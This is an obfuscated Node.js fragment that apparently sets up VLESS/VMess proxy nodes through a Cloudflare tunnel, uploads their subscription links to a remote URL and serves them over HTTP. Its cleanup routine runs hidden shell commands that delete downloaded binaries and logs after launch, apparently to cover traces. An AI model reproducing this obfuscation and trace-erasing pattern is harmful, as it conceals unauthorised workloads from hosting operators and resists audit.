_0x150f6f={_0x5a0d95:0x130,_0x24d91e:0x198,_0x462703:0x190,_0x3fe182:0x113,_0x3489a8:0x188,_0x4035b7:0x1c7,_0x43dc0c:0x1b3,_0x975e34:0x147,_0x1d08af:0x1a0,_0x160cb9:0x1b0,_0x5f5660:0x157,_0x4fad3b:0x1a0,_0x3a1245:0x11a},_0x241c24=await _0x1795d0(),_0xe05348=NAME?NAME+'-'+_0x241c24:_0x241c24;return new Promise(_0x2bec7c=>{setTimeout(()=>{const _0x161f4d={_0xa662d0:0x180,_0x4a5a04:0x14c,_0x4a258d:0x16a},_0x15ffad=_0x385a,_0x12103b={'v':'2','ps':''+_0xe05348,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x15ffad(0x183),'net':'ws','type':_0x15ffad(_0x150f6f._0x5a0d95),'host':_0x50336a,'path':_0x15ffad(_0x150f6f._0x24d91e),'tls':_0x15ffad(0x1d1),'sni':_0x50336a,'alpn':'','fp':_0x15ffad(0x184)},_0x847328=_0x15ffad(_0x150f6f._0x462703)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x50336a+_0x15ffad(0x19e)+_0x50336a+_0x15ffad(0x152)+_0xe05348+_0x15ffad(0x156)+Buffer[_0x15ffad(0x157)](JSON[_0x15ffad(_0x150f6f._0x3fe182)](_0x12103b))['toString'](_0x15ffad(0x1b0))+_0x15ffad(_0x150f6f._0x3489a8)+UUID+'@'+CFIP+':'+CFPORT+_0x15ffad(_0x150f6f._0x4035b7)+_0x50336a+_0x15ffad(0x19e)+_0x50336a+_0x15ffad(_0x150f6f._0x43dc0c)+_0xe05348+_0x15ffad(_0x150f6f._0x975e34);console[_0x15ffad(_0x150f6f._0x1d08af)](Buffer[_0x15ffad(0x157)](_0x847328)[_0x15ffad(0x124)](_0x15ffad(_0x150f6f._0x160cb9))),fs['writeFileSync'](subPath,Buffer[_0x15ffad(_0x150f6f._0x5f5660)](_0x847328)[_0x15ffad(0x124)]('base64')),console[_0x15ffad(_0x150f6f._0x4fad3b)](FILE_PATH+_0x15ffad(_0x150f6f._0x3a1245)),uploadNodes(),app[_0x15ffad(0x144)]('/'+SUB_PATH,(_0x4e1c41,_0x304fcc)=>{const _0x412356=_0x15ffad,_0x63561a=Buffer['from'](_0x847328)[_0x412356(0x124)]('base64');_0x304fcc[_0x412356(_0x161f4d._0xa662d0)](_0x412356(_0x161f4d._0x4a5a04),_0x412356(_0x161f4d._0x4a258d)),_0x304fcc[_0x412356(0x1a6)](_0x63561a);}),_0x2bec7c(_0x847328);},0x7d0);});}}async function uploadNodes(){const _0x29233c={_0x33b3d4:0x1b2,_0x214d88:0x176,_0x3e758a:0x1b8,_0x5ce33a:0x1ce,_0x3d4816:0x16e,_0x3e86f8:0x140,_0x17f1eb:0x113,_0xa771b6:0x12f,_0xaf99de:0x1c0},_0x573cf6=_0x2ad559;if(UPLOAD_URL&&PROJECT_URL){const _0x7d325b=PROJECT_URL+'/'+SUB_PATH,_0x522a53={'subscription':[_0x7d325b]};try{const _0xe4ec74=await axios[_0x573cf6(0x12f)](UPLOAD_URL+_0x573cf6(_0x29233c._0x33b3d4),_0x522a53,{'headers':{'Content-Type':_0x573cf6(0x121)}});return _0xe4ec74&&_0xe4ec74[_0x573cf6(_0x29233c._0x214d88)]===0xc8?(console[_0x573cf6(0x1a0)](_0x573cf6(_0x29233c._0x3e758a)),_0xe4ec74):null;}catch(_0x28431c){if(_0x28431c['response']){if(_0x28431c[_0x573cf6(0x1d2)][_0x573cf6(0x176)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x573cf6(0x174)](listPath))return;const _0x5449f6=fs[_0x573cf6(0x114)](listPath,_0x573cf6(_0x29233c._0x5ce33a)),_0x3910f0=_0x5449f6[_0x573cf6(_0x29233c._0x3d4816)]('\x0a')['filter'](_0x56f9e7=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x573cf6(0x167)](_0x56f9e7));if(_0x3910f0[_0x573cf6(_0x29233c._0x3e86f8)]===0x0)return;const _0x1b99c8=JSON[_0x573cf6(_0x29233c._0x17f1eb)]({'nodes':_0x3910f0});try{const _0x4ca34f=await axios[_0x573cf6(_0x29233c._0xa771b6)](UPLOAD_URL+_0x573cf6(_0x29233c._0xaf99de),_0x1b99c8,{'headers':{'Content-Type':_0x573cf6(0x121)}});return _0x4ca34f&&_0x4ca34f[_0x573cf6(_0x29233c._0x214d88)]===0xc8?(console[_0x573cf6(0x1a0)](_0x573cf6(0x132)),_0x4ca34f):null;}catch(_0x40a405){return null;}}else return;}}function cleanFiles(){const _0x302ff9={_0x4ab907:0x119,_0x22db42:0x1bc,_0x255904:0x1c6,_0x17a385:0x12c,_0x43c5b5:0x1c9},_0x15f724={_0x27adc2:0x12a,_0x57e612:0x1a0},_0x7d3db7={_0x436af9:0x1a0};setTimeout(()=>{const _0x88f907=_0x385a,_0x3cb737=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x3cb737[_0x88f907(_0x302ff9._0x4ab907)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3cb737[_0x88f907(0x119)](phpPath);process[_0x88f907(_0x302ff9._0x22db42)]==='win32'?exec(_0x88f907(_0x302ff9._0x255904)+_0x3cb737[_0x88f907(_0x302ff9._0x17a385)]('\x20')+_0x88f907(0x126),_0x39050e=>{const _0x4d15f6=_0x88f907;console[_0x4d15f6(0x12a)](),console[_0x4d15f6(0x1a0)]('App\x20is\x20running'),console[_0x4d15f6(_0x7d3db7._0x436af9)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x88f907(_0x302ff9._0x43c5b5)+_0x3cb737[_0x88f907(_0x302ff9._0x17a385)]('\x20')+_0x88f907(0x1ae),_0x25d543=>{const _0x2ddcda=_0x88f907;console[_0x2ddcda(_0x15f724._0x27adc2)](),console[_0x2ddcda(0x1a0)](_0x2ddcda(0x19c)),console[_0x2ddcda(_0x15f724._0x57e612)](_0x2ddcda(0x1ab));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x39d9e1={_0x438a8a:0x1af,_0x4ec574:0x12f,_0x2d5009:0x13a,_0xff486c:0x110},_0x21c8a0=_0x2ad559;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x21c8a0(0x1a0)](_0x21c8a0(_0x39d9e1._0x438a8a));return;}try{const _0x1d2b45=await axios[_0x21c8a0(_0x39d9e1._0x4ec574)](_0x21c8a0(0x1b6),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x21c8a0(0x121)}});return console['log'](_0x21c8a0(_0x39d9e1._0x2d5009)),_0x1d2b45;}catch(_0x3d5038){return console['error'](_0x21c8a0(_0x39d9e1._0xff486c)+_0x3d5038[_0x21c8a0(0x170)]),null;}}async function startserver(){const _0x2e37b4={_0x59197e:0x1d0},_0x516905=_0x2ad559;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x5c903f){console[_0x516905(0x148)](_0x516905(_0x2e37b4._0x59197e),_0x5c903f);}}startserver()[_0x2ad559(0x125)](_0x2b8feb=>{const _0x411228={_0x5d50dc:0x163},_0x4bdf35=_0x2ad559;console[_0x4bdf35(0x148)](_0x4bdf35(_0x411228._0x5d50dc),_0x2b8feb);}),app[_0x2ad559(0x144)]('/',async function(_0x4a792e,_0x513ea1){const _0x1a0629={_0x250615:0x149,_0xea77cd:0x14f,_0x369415:0x1a6},_0x1ba0c6=_0x2ad559;try{const _0x19cb7f=path[_0x1ba0c6(0x12c)](__dirname,_0x1ba0c6(0x112)),_0x4cf55f=await fs[_0x1ba0c6(_0x1a0629._0x250615)]['readFile'](_0x19cb7f,_0x1ba0c6(_0x1a0629._0xea77cd));_0x513ea1[_0x1ba0c6(_0x1a0629._0x369415)](_0x4cf55f);}catch(_0xd5ad9e){_0x513ea1[_0x1ba0c6(0x1a6)](_0x1ba0c6(0x1ac));}}),app[_0x2ad559(0x15c)](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
